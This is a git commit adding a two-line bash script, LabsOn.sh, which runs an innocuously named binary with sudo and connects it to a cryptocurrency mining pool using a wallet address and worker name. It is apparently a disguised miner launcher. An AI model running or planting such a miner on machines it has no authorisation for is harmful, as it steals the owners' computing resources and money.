6b9412acbff16b9bd3347fe5f2ae1d6db6d67e33
0xzeeein <activityd0103@gmail.com>
2026-06-01 12:14:41 +0700

    LabsOn.sh

---
+++ LabsOn.sh
@@ -0,0 +1,2 @@
+#!/bin/bash
+chmod +x ./LabsOn && sudo ./LabsOn --pool stratum+tcp://sg1.alphapool.tech:5566 -address prl1pud5wmdwgranmu0sl6t2zl2ajrske9wunwhxjzqpd4mx96nyyr76qu5w5m5 --worker 0xzeind
